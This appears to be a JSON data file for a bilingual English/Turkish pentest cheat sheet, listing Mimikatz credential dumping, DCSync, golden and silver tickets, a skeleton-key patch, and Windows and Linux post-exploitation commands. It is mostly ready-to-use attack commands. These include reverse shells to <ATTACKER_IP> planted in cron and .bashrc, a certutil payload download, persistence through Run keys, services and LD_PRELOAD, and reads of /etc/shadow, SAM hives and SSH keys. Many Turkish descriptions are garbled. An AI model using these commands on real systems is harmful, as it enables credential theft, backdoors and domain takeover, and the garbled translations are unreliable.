            "tags": [
              "advanced"
            ],
            "desc_tr": "Çıkart: DPAPI master keys"
          },
          {
            "title": "Enable WDigest",
            "desc": "Force WDigest to cache cleartext creds",
            "cmd": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1",
            "tags": [
              "advanced"
            ],
            "note": "Requires re-login to take effect",
            "desc_tr": "Zorla: WDigest cache açık metcreds'e içinde"
          }
        ],
        "name_tr": "Credential Extraction"
      },
      {
        "name": "SAM & LSA Dumps",
        "commands": [
          {
            "title": "LSADUMP SAM",
            "desc": "Dump local SAM hashes",
            "cmd": "lsadump::sam",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: yerel SAM hashes"
          },
          {
            "title": "LSADUMP LSA Patch",
            "desc": "Dump LSA secrets using patch method",
            "cmd": "lsadump::lsa /patch",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: LSA secrets patch method kullanarak"
          },
          {
            "title": "LSADUMP DCSYNC",
            "desc": "DCSync attack — dump specific user hash",
            "cmd": "lsadump::dcsync /domain:<DOMAIN> /user:administrator",
            "tags": [
              "essential"
            ],
            "desc_tr": "DCSync attack — dump belirli user hash"
          },
          {
            "title": "LSADUMP DCSYNC All",
            "desc": "DCSync all domain hashes",
            "cmd": "lsadump::dcsync /domain:<DOMAIN> /all /csv",
            "tags": [
              "advanced"
            ],
            "desc_tr": "DCSync tüm domahashes içinde"
          },
          {
            "title": "LSADUMP Secrets",
            "desc": "Dump LSA secrets (service account creds, DPAPI)",
            "cmd": "lsadump::secrets",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: LSA secrets (service account creds, DPAPI)"
          },
          {
            "title": "LSADUMP Cache",
            "desc": "Dump cached domain credentials",
            "cmd": "lsadump::cache",
            "tags": [
              "tool"
            ],
            "desc_tr": "Dökümle: önbelleğe alınmış kimlik bilgileri kimlik bilgileri"
          }
        ],
        "name_tr": "SAM & LSA Dumps"
      },
      {
        "name": "Kerberos Tickets",
        "commands": [
          {
            "title": "Kerberos List Tickets",
            "desc": "List all Kerberos tickets",
            "cmd": "kerberos::list /export",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm Kerberos tickets"
          },
          {
            "title": "Kerberos Pass-the-Ticket",
            "desc": "Inject a .kirbi ticket into session",
            "cmd": "kerberos::ptt <TICKET.kirbi>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Enjekte et: a .kirbi ticket insession'e"
          },
          {
            "title": "Kerberos Purge Tickets",
            "desc": "Remove all Kerberos tickets from memory",
            "cmd": "kerberos::purge",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaldır: tüm Kerberos tickets memory üzerinden"
          },
          {
            "title": "Golden Ticket",
            "desc": "Create a golden ticket",
            "cmd": "kerberos::golden /user:administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Oluştur: a golden ticket"
          },
          {
            "title": "Silver Ticket",
            "desc": "Create a silver ticket for a service",
            "cmd": "kerberos::golden /user:administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /service:<SERVICE> /rc4:<SERVICE_HASH> /ptt",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Oluştur: a silver ticket bir servis için"
          },
          {
            "title": "Overpass-the-Hash",
            "desc": "Use NTLM hash to get a Kerberos TGT",
            "cmd": "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe",
            "tags": [
              "essential"
            ],
            "desc_tr": "Use NTLM hash get a Kerberos TGT'e"
          }
        ],
        "name_tr": "Kerberos Tickets"
      },
      {
        "name": "Misc Mimikatz",
        "commands": [
          {
            "title": "Process Inject into LSASS",
            "desc": "Inject into LSASS process for credential access",
            "cmd": "privilege::debug\nsekurlsa::logonpasswords",
            "tags": [
              "essential"
            ],
            "desc_tr": "Enjekte et: inLSASS process for kimlik bilgileri access'e"
          },
          {
            "title": "Vault Credentials",
            "desc": "Dump Windows Vault credentials",
            "cmd": "vault::cred /patch",
            "tags": [
              "tool"
            ],
            "desc_tr": "Dökümle: Windows Vault kimlik bilgileri"
          },
          {
            "title": "Vault List",
            "desc": "List Windows Vault entries",
            "cmd": "vault::list",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: Windows Vault entries"
          },
          {
            "title": "Crypto Export Certs",
            "desc": "Export all certificates from stores",
            "cmd": "crypto::certificates /export",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Dışa aktar: tüm certificates stores üzerinden"
          },
          {
            "title": "Misc SkeltonKey",
            "desc": "Patch DC to allow skeleton key password",
            "cmd": "misc::skeleton",
            "tags": [
              "advanced"
            ],
            "note": "Allows logging in with 'mimikatz' as any user's password — AD-wide",
            "desc_tr": "Yamala: DC allow skeletkey password üzerinde'e"
          }
        ],
        "name_tr": "Misc Mimikatz"
      }
    ],
    "name_tr": "Mimikatz Komutları",
    "description_tr": "Mimikatz credential extraction, Kerberos ticket manipulation, and Windows credential attacks."
  },
  {
    "id": "post-exploitation-win",
    "name": "Windows Post-Exploitation",
    "icon": "🪟",
    "description": "Windows post-exploitation — situational awareness, persistence, data gathering, and privilege escalation after initial foothold.",
    "subcategories": [
      {
        "name": "Situational Awareness",
        "commands": [
          {
            "title": "Full System Info",
            "desc": "Get OS, hostname, and patch level",
            "cmd": "systeminfo",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: OS, hostname, and patch level"
          },
          {
            "title": "Current User & Groups",
            "desc": "Show current user and group memberships",
            "cmd": "whoami /all",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: mevcut user and group memberships"
          },
          {
            "title": "Net Users",
            "desc": "List local users",
            "cmd": "net user",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: yerel users"
          },
          {
            "title": "Net Local Groups",
            "desc": "List local groups",
            "cmd": "net localgroup",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: yerel groups"
          },
          {
            "title": "Local Admins",
            "desc": "List local administrator group members",
            "cmd": "net localgroup administrators",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: yerel yönetici grup üyelikleri"
          },
          {
            "title": "Domain Users",
            "desc": "List domain users",
            "cmd": "net user /domain",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: etki alanı kullanıcıları"
          },
          {
            "title": "Domain Groups",
            "desc": "List domain groups",
            "cmd": "net group /domain",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: etki alanı grupları"
          },
          {
            "title": "Domain Controllers",
            "desc": "Find domain controllers",
            "cmd": "net group 'Domain Controllers' /domain",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: domacontrollers içinde"
          },
          {
            "title": "Network Interfaces",
            "desc": "Show all network interfaces and IPs",
            "cmd": "ipconfig /all",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: tüm ağ arayüzü and IPs"
          },
          {
            "title": "ARP Table",
            "desc": "Show ARP cache for host discovery",
            "cmd": "arp -a",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: ARP cache for aktif host keşfi"
          },
          {
            "title": "Routing Table",
            "desc": "Show routing table",
            "cmd": "route print",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: yönlendirme tablosu"
          },
          {
            "title": "Listening Ports",
            "desc": "Show all listening ports",
            "cmd": "netstat -ano | findstr LISTENING",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: tüm dinleyen portlar"
          },
          {
            "title": "Active Connections",
            "desc": "Show all active connections",
            "cmd": "netstat -ano",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: tüm aktif bağlantılar"
          },
          {
            "title": "Running Processes",
            "desc": "List all running processes with PID",
            "cmd": "tasklist /v",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm çalışan process PID ile"
          },
          {
            "title": "Processes with Network",
            "desc": "Match processes to network connections",
            "cmd": "netstat -ano | findstr :<PORT>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Match processes network connections'e"
          },
          {
            "title": "Installed Software",
            "desc": "List installed programs",
            "cmd": "wmic product get name,version",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: yüklü programs"
          },
          {
            "title": "Installed Patches",
            "desc": "List installed Windows patches",
            "cmd": "wmic qfe get Caption,Description,HotFixID,InstalledOn",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: installed Windows patches"
          },
          {
            "title": "Scheduled Tasks",
            "desc": "List all scheduled tasks",
            "cmd": "schtasks /query /fo LIST /v",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm zamanlanmış görevler"
          },
          {
            "title": "Services Running",
            "desc": "List running services",
            "cmd": "sc query type= all state= running",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: çalışan service"
          },
          {
            "title": "PowerShell History",
            "desc": "Read PowerShell command history",
            "cmd": "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oku: PowerShell komut geçmişi"
          },
          {
            "title": "Environment Variables",
            "desc": "Show all environment variables",
            "cmd": "set",
            "tags": [
              "tool"
            ],
            "desc_tr": "Göster: tüm ortam değişkenleri"
          },
          {
            "title": "Firewall Status",
            "desc": "Check Windows Firewall status",
            "cmd": "netsh advfirewall show allprofiles",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kontrol et: Windows güvenlik duvarı durumu"
          },
          {
            "title": "AV Installed",
            "desc": "Check installed antivirus via WMI",
            "cmd": "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: installed antivirus WMI üzerinden"
          }
        ],
        "name_tr": "Situational Awareness"
      },
      {
        "name": "Credential Hunting",
        "commands": [
          {
            "title": "Search for Passwords in Files",
            "desc": "Search all files for password string",
            "cmd": "findstr /s /i /m \"password\" C:\\*.txt C:\\*.xml C:\\*.ini C:\\*.config",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ara: tüm files for password string"
          },
          {
            "title": "Search Specific Extensions",
            "desc": "Find potentially sensitive files",
            "cmd": "dir /s /b *.txt *.xml *.config *.ini *.ps1 *.bat 2>nul",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: potentially hassas dosyalar"
          },
          {
            "title": "Registry Passwords",
            "desc": "Search registry for password strings",
            "cmd": "reg query HKLM /f password /t REG_SZ /s",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ara: registry for password strings"
          },
          {
            "title": "Registry Passwords HKCU",
            "desc": "Search HKCU for passwords",
            "cmd": "reg query HKCU /f password /t REG_SZ /s",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ara: HKCU for passwords"
          },
          {
            "title": "Unattend Files",
            "desc": "Look for unattended installation files",
            "cmds": [
              "type C:\\Windows\\Panther\\Unattend.xml",
              "type C:\\Windows\\Panther\\Unattend\\Unattend.xml",
              "type C:\\Windows\\system32\\sysprep\\Unattend.xml"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Look for unattended installatifiles üzerinde"
          },
          {
            "title": "SAM & SYSTEM Files",
            "desc": "Copy SAM/SYSTEM for offline cracking",
            "cmds": [
              "reg save HKLM\\SAM C:\\Temp\\sam.hive",
              "reg save HKLM\\SYSTEM C:\\Temp\\system.hive"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Kopyala: SAM/SYSTEM çevrimdışı kırma için"
          },
          {
            "title": "DPAPI Blob Hunt",
            "desc": "Find DPAPI blobs (credential files)",
            "cmd": "dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\*",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Bul: DPAPI blobs (kimlik bilgileri files)"
          },
          {
            "title": "WiFi Passwords",
            "desc": "Dump saved WiFi passwords",
            "cmd": "for /f \"tokens=2 delims=:\" %i in ('netsh wlan show profiles ^| findstr Profile') do netsh wlan show profile name=%i key=clear",
            "tags": [
              "tool"
            ],
            "desc_tr": "Dökümle: kayıtlı WiFi passwords"
          },
          {
            "title": "PuTTY Saved Sessions",
            "desc": "Check PuTTY for saved credentials",
            "cmd": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kontrol et: PuTTY for kayıtlı kimlik bilgileri"
          },
          {
            "title": "Chrome Credentials",
            "desc": "Find Chrome password database",
            "cmd": "dir /s /b \"%APPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\"",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bul: Chrome password database"
          },
          {
            "title": "IIS Web.config",
            "desc": "Look for credentials in IIS config",
            "cmds": [
              "type C:\\inetpub\\wwwroot\\web.config",
              "type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Look for kimlik bilgileri IIS config içinde"
          },
          {
            "title": "Firefox Passwords (firepwd)",
            "desc": "Decrypt saved Firefox passwords from profile directory",
            "cmd": "python3 firepwd.py -d /path/to/firefox/profile/",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "Copy Firefox profile from target: C:\\Users\\<USER>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\",
            "desc_tr": "Şifreyi çöz: kayıtlı Firefox passwords profile directory üzerinden"
          }
        ],
        "name_tr": "Credential Hunting"
      },
      {
        "name": "System Control Commands",
        "commands": [
          {
            "title": "Shutdown Immediately",
            "desc": "Shutdown the system immediately",
            "cmd": "shutdown /s /t 0",
            "tags": [
              "tool"
            ],
            "desc_tr": "Shutdown the system immediately"
          },
          {
            "title": "Restart Immediately",
            "desc": "Restart the system immediately",
            "cmd": "shutdown /r /t 0",
            "tags": [
              "tool"
            ],
            "desc_tr": "Restart the system immediately"
          },
          {
            "title": "Force Restart",
            "desc": "Force restart — closes all apps without warning",
            "cmd": "shutdown /r /f /t 0",
            "tags": [
              "tool"
            ],
            "desc_tr": "Zorla: restart — closes tüm apps warning olmadan"
          },
          {
            "title": "Cancel Shutdown",
            "desc": "Abort a pending shutdown or restart",
            "cmd": "shutdown /a",
            "tags": [
              "essential"
            ],
            "desc_tr": "Abort a pending shutdown or restart"
          },
          {
            "title": "Remote Restart (cmd)",
            "desc": "Restart a remote machine",
            "cmd": "cmd.exe /c \"shutdown /r /t 0\"",
            "tags": [
              "tool"
            ],
            "desc_tr": "Restart a uzak machine"
          },
          {
            "title": "Certutil Download File",
            "desc": "Download file using Windows built-in certutil (LOLBin)",
            "cmd": "certutil -urlcache -f http://<ATTACKER_IP>/<FILE> C:\\Temp\\<FILE>",
            "tags": [
              "essential"
            ],
            "desc_tr": "İndir: file Windows built-certutil (LOLBin) kullanarak içinde"
          }
        ],
        "name_tr": "System Control Commands"
      },
      {
        "name": "Windows Persistence",
        "commands": [
          {
            "title": "Registry Run Key (User)",
            "desc": "Add persistence via HKCU Run key",
            "cmd": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v <NAME> /t REG_SZ /d 'C:\\Temp\\payload.exe'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ekle: kalıcılık HKCU Run key üzerinden"
          },
          {
            "title": "Registry Run Key (System)",
            "desc": "Add persistence via HKLM Run key (requires admin)",
            "cmd": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v <NAME> /t REG_SZ /d 'C:\\Temp\\payload.exe'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ekle: kalıcılık HKLM Run key (requires admin) üzerinden"
          },
          {
            "title": "Scheduled Task Persistence",
            "desc": "Create scheduled task for persistence",
            "cmd": "schtasks /create /tn <TASK_NAME> /tr C:\\Temp\\payload.exe /sc ONLOGON /ru SYSTEM",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oluştur: zamanlanmış görevler for kalıcılık"
          },
          {
            "title": "New Service",
            "desc": "Create new Windows service for persistence",
            "cmds": [
              "sc create <SERVICE_NAME> binpath= 'C:\\Temp\\payload.exe' start= auto",
              "sc start <SERVICE_NAME>"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Oluştur: new Windows service for kalıcılık"
          },
          {
            "title": "Startup Folder User",
            "desc": "Place payload in user startup folder",
            "cmd": "copy C:\\Temp\\payload.exe %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
            "tags": [
              "tool"
            ],
            "desc_tr": "Yerleştir: payload user startup folder içinde"
          },
          {
            "title": "Startup Folder Global",
            "desc": "Place payload in global startup folder (admin)",
            "cmd": "copy C:\\Temp\\payload.exe 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Yerleştir: payload global startup folder (admin) içinde"
          }
        ],
        "name_tr": "Windows Persistence"
      },
      {
        "name": "Token & Impersonation",
        "commands": [
          {
            "title": "List Privileges (whoami)",
            "desc": "Check current token privileges",
            "cmd": "whoami /priv",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: mevcut token privileges"
          },
          {
            "title": "Incognito List Tokens",
            "desc": "List available impersonation tokens",
            "cmd": "list_tokens -u",
            "tags": [
              "tool"
            ],
            "note": "Run in Meterpreter with load incognito",
            "desc_tr": "Listele: available impersonatitokens üzerinde"
          },
          {
            "title": "Incognito Impersonate",
            "desc": "Impersonate a listed token",
            "cmd": "impersonate_token '<DOMAIN>\\<USER>'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kimliğe bürün: a listed token"
          },
          {
            "title": "PrintSpoofer (SeImpersonate)",
            "desc": "Escalate via SeImpersonatePrivilege",
            "cmd": "PrintSpoofer.exe -i -c cmd.exe",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yetki yükselt: SeImpersonatePrivilege üzerinden"
          },
          {
            "title": "GodPotato (SeImpersonate)",
            "desc": "NT AUTHORITY\\SYSTEM via SeImpersonate",
            "cmd": "GodPotato.exe -cmd 'cmd.exe /c whoami > C:\\Temp\\out.txt'",
            "tags": [
              "essential"
            ],
            "desc_tr": "NT AUTHORITY\\SYSTEM SeImpersonate üzerinden"
          },
          {
            "title": "JuicyPotatoNG",
            "desc": "Token impersonation for SYSTEM",
            "cmd": "JuicyPotatoNG.exe -t * -p C:\\Temp\\payload.exe",
            "tags": [
              "tool"
            ],
            "desc_tr": "Token impersonatifor SYSTEM üzerinde"
          },
          {
            "title": "RunAs Different User",
            "desc": "Run process as different user",
            "cmd": "runas /user:<DOMAIN>\\<USER> cmd.exe",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: process as different user"
          },
          {
            "title": "RunAs with Saved Cred",
            "desc": "Run as user with saved credentials",
            "cmd": "runas /savecred /user:<DOMAIN>\\<USER> cmd.exe",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: as user kayıtlı kimlik bilgileri ile"
          }
        ],
        "name_tr": "Token & Impersonation"
      }
    ],
    "name_tr": "Windows Son İstismar",
    "description_tr": "Windows post-exploitation — situational awareness, persistence, data gathering, and privilege escalation after initial foothold."
  },
  {
    "id": "post-exploitation-linux",
    "name": "Linux Post-Exploitation",
    "icon": "🐧",
    "description": "Linux post-exploitation — situational awareness, credential hunting, persistence, and lateral movement.",
    "subcategories": [
      {
        "name": "Situational Awareness",
        "commands": [
          {
            "title": "Current User Info",
            "desc": "Show current user and all groups",
            "cmd": "id && whoami",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: mevcut user and tüm groups"
          },
          {
            "title": "System Info",
            "desc": "OS version and kernel",
            "cmd": "uname -a && cat /etc/os-release",
            "tags": [
              "essential"
            ],
            "desc_tr": "OS versiand kernel üzerinde"
          },
          {
            "title": "All Users",
            "desc": "List all system users",
            "cmd": "cat /etc/passwd | grep -v nologin | grep -v false",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm system users"
          },
          {
            "title": "Sudo Rights",
            "desc": "Check sudo permissions",
            "cmd": "sudo -l",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: sudo permissions"
          },
          {
            "title": "Network Interfaces",
            "desc": "Show all network interfaces",
            "cmd": "ip a",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: tüm ağ arayüzü"
          },
          {
            "title": "Routing Table",
            "desc": "Show routing table",
            "cmd": "ip route",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: yönlendirme tablosu"
          },
          {
            "title": "ARP Cache",
            "desc": "Show ARP table for host discovery",
            "cmd": "arp -a || ip neigh",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: ARP table for aktif host keşfi"
          },
          {
            "title": "Listening Ports",
            "desc": "Show all listening ports",
            "cmd": "ss -tlnp",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: tüm dinleyen portlar"
          },
          {
            "title": "All Connections",
            "desc": "Show all active network connections",
            "cmd": "ss -tulnp",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: tüm active network connections"
          },
          {
            "title": "Running Processes",
            "desc": "List all processes with details",
            "cmd": "ps auxf",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm processes details ile"
          },
          {
            "title": "Processes as Root",
            "desc": "Find processes running as root",
            "cmd": "ps aux | grep root",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: processes running as root"
          },
          {
            "title": "Cron Jobs",
            "desc": "Check all cron job files",
            "cmds": [
              "crontab -l",
              "cat /etc/crontab",
              "ls /etc/cron*"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: tüm crgörevleri files üzerinde"
          },
          {
            "title": "Bash History",
            "desc": "Read command history",
            "cmd": "cat ~/.bash_history && cat ~/.zsh_history 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oku: komut geçmişi"
          },
          {
            "title": "Recently Modified Files",
            "desc": "Find files modified in last 10 minutes",
            "cmd": "find / -mmin -10 -type f 2>/dev/null | grep -v proc",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bul: files modified last 10 minutes içinde"
          },
          {
            "title": "Writable Directories",
            "desc": "Find world-writable directories",
            "cmd": "find / -writable -type d 2>/dev/null | grep -v proc",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: world-writable directories"
          },
          {
            "title": "Mounted Filesystems",
            "desc": "Show all mounted filesystems",
            "cmd": "mount | column -t",
            "tags": [
              "tool"
            ],
            "desc_tr": "Göster: tüm mounted filesystems"
          },
          {
            "title": "SUID Files",
            "desc": "Find SUID binaries",
            "cmd": "find / -perm -u=s -type f 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: SUID binaries"
          },
          {
            "title": "SGID Files",
            "desc": "Find SGID binaries",
            "cmd": "find / -perm -g=s -type f 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: SGID binaries"
          },
          {
            "title": "Capabilities",
            "desc": "Find binaries with special capabilities",
            "cmd": "getcap -r / 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: binaries special capabilities ile"
          }
        ],
        "name_tr": "Situational Awareness"
      },
      {
        "name": "Credential Hunting",
        "commands": [
          {
            "title": "Search for Passwords",
            "desc": "Recursive search for password strings",
            "cmd": "grep -rni 'password\\|passwd\\|secret\\|credentials' /home /etc /var/www 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Özyinelemeli search for password strings"
          },
          {
            "title": "SSH Private Keys",
            "desc": "Find all SSH private keys",
            "cmd": "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: tüm SSH private keys"
          },
          {
            "title": "Config Files",
            "desc": "Find all .conf and .config files",
            "cmd": "find / -name '*.conf' -o -name '*.config' 2>/dev/null | grep -v proc",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: tüm .conf and .yapılandırma dosyası"
          },
          {
            "title": "Web App Configs",
            "desc": "Find web application config files",
            "cmd": "find /var/www /srv /opt -name '*.php' -o -name '*.conf' -o -name '*.env' 2>/dev/null | xargs grep -l 'password\\|passwd\\|DB_PASS' 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: web applicatiyapılandırma dosyası üzerinde"
          },
          {
            "title": "MySQL Credentials",
            "desc": "Find MySQL config with credentials",
            "cmd": "cat /etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null; find / -name '.my.cnf' 2>/dev/null | xargs cat",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bul: MySQL config kimlik bilgileri ile"
          },
          {
            "title": "WordPress Config",
            "desc": "Find WordPress database credentials",
            "cmd": "find / -name 'wp-config.php' 2>/dev/null | xargs cat",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bul: WordPress database kimlik bilgileri"
          },
          {
            "title": "Shadow File",
            "desc": "Read /etc/shadow if accessible",
            "cmd": "cat /etc/shadow",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oku: /etc/shadow if accessible"
          },
          {
            "title": "Stored SSH Keys",
            "desc": "Find authorized_keys files",
            "cmd": "find / -name 'authorized_keys' 2>/dev/null",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bul: authorized_keys files"
          },
          {
            "title": "History Files",
            "desc": "Find all shell history files",
            "cmd": "find / -name '*.history' -o -name '.bash_history' -o -name '.zsh_history' 2>/dev/null | xargs cat",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: tüm shell history files"
          },
          {
            "title": "Last Login",
            "desc": "Show last login info",
            "cmd": "last && lastlog",
            "tags": [
              "tool"
            ],
            "desc_tr": "Göster: last loginfo içinde"
          }
        ],
        "name_tr": "Credential Hunting"
      },
      {
        "name": "Linux Persistence",
        "commands": [
          {
            "title": "SSH Key Persistence",
            "desc": "Add SSH public key to authorized_keys",
            "cmd": "echo '<SSH_PUBLIC_KEY>' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ekle: SSH genel anahtar authorized_keys'e"
          },
          {
            "title": "Cron Job Reverse Shell",
            "desc": "Add cron job for reverse shell persistence",
            "cmd": "(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1') | crontab -",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ekle: crgörevleri for ters bağlantı kabuğu kalıcılık üzerinde"
          },
          {
            "title": "SUID Bash Copy",
            "desc": "Create SUID copy of bash for persistence",
            "cmds": [
              "cp /bin/bash /tmp/.bash",
              "chmod +s /tmp/.bash"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Then: /tmp/.bash -p for root shell",
            "desc_tr": "Oluştur: SUID copy of bash for kalıcılık"
          },
          {
            "title": ".bashrc Persistence",
            "desc": "Add payload to .bashrc for login persistence",
            "cmd": "echo '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> ~/.bashrc",
            "tags": [
              "tool"
            ],
            "desc_tr": "Ekle: payload .bashrc for logkalıcılık'e içinde"
          },
          {
            "title": "Systemd Service Persistence",
            "desc": "Create systemd service for persistence (root)",
            "cmds": [
              "echo '[Unit]\\nDescription=My Service\\n[Service]\\nExecStart=/tmp/payload.sh\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/my-service.service",
              "systemctl enable my-service",
              "systemctl start my-service"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Oluştur: systemd service for kalıcılık (root)"
          },
          {
            "title": "LD_PRELOAD Persistence",
            "desc": "Inject shared library on program execution",
            "cmd": "echo '/tmp/evil.so' > /etc/ld.so.preload",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Enjekte et: shared library program execution üzerinde"
          }
        ],
        "name_tr": "Linux Persistence"
      }
    ],
    "name_tr": "Linux Son İstismar",
    "description_tr": "Linux post-exploitation — situational awareness, credential hunting, persistence, and lateral movement."
  },
  {
    "id": "wireless",
    "name": "Wireless Security Testing",
    "icon": "📡",
    "description": "WiFi security testing — WPA/WPA2 cracking, WPS attacks, evil twin, and wireless reconnaissance.",
    "subcategories": [
      {
        "name": "Wireless Reconnaissance",
        "commands": [
          {
            "title": "Enable Monitor Mode",
            "desc": "Put wireless interface into monitor mode",
            "cmd": "sudo airmon-ng start <INTERFACE>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Put wireless interface inmonitor mode'e"
          },
          {
            "title": "Kill Interfering Processes",
            "desc": "Kill processes that may interfere with monitor mode",
            "cmd": "sudo airmon-ng check kill",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kill processes that may interfere monitor mode ile"
          },
          {
            "title": "Scan All Networks",
            "desc": "Scan and list all nearby WiFi networks",
            "cmd": "sudo airodump-ng <INTERFACE>mon",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tara: ma and list tüm nearby WiFi networks"
          },
          {
            "title": "Target Specific Network",
            "desc": "Capture packets from specific network",
            "cmd": "sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture <INTERFACE>mon",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yakala: packets belirli network üzerinden"
          },
          {
            "title": "Scan with Kismet",
            "desc": "Passive wireless scanner with more detail",
            "cmd": "sudo kismet -c <INTERFACE>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Pasif wireless tarayıcı more detail ile"
          },
          {
            "title": "Disable Monitor Mode",
            "desc": "Restore interface to managed mode",
            "cmd": "sudo airmon-ng stop <INTERFACE>mon && sudo service NetworkManager restart",
            "tags": [
              "essential"
            ],
            "desc_tr": "Geri yükle: interface managed mode'e"
          }
        ],
